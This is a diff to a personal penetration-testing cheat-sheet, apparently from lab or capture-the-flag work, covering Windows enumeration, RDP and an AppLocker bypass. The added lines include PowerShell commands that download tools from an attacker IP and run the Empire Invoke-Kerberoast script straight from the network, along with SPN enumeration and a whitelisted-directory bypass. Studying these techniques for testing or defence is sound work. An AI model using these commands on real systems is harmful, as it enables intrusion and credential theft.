@@ -4,6 +4,7 @@
     - [Enumeration](#enumeration)
 - [SMB](#smb)
 - [RDP](#rdp)
+- [Bypass Applocker](#bypass-applocker)
 
 # Commands
 - systeminof
@@ -104,13 +105,19 @@
 
 - findstr = grep
 - Windows: get file 
-- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
+- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.9.1.255/file.ext
+- powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.9.1.255:80/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
 - powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"
 
 - check permision
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
 
 - powershell.exe
+
+- Enumerate
+  -  setspn -T medin -Q ​ */* 
+- Invoke Kereberosast script:
+  - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
   
 ## Stabilize and Post Exploit windows
 - Create user + add group admin
@@ -228,5 +235,17 @@
   - smb-vuln*
 
 # RDP
-xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
+- Basic login
+  - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
 
+- Mount local folder:
+  - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
+
+
+# Bypass Applocker
+- Applocker: restrict programs from being executed
+- Windows 7 default
+  - whitelisted directory
+    - C:\Windows\System32\spool\drivers\color
+- Windows history:
+  - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
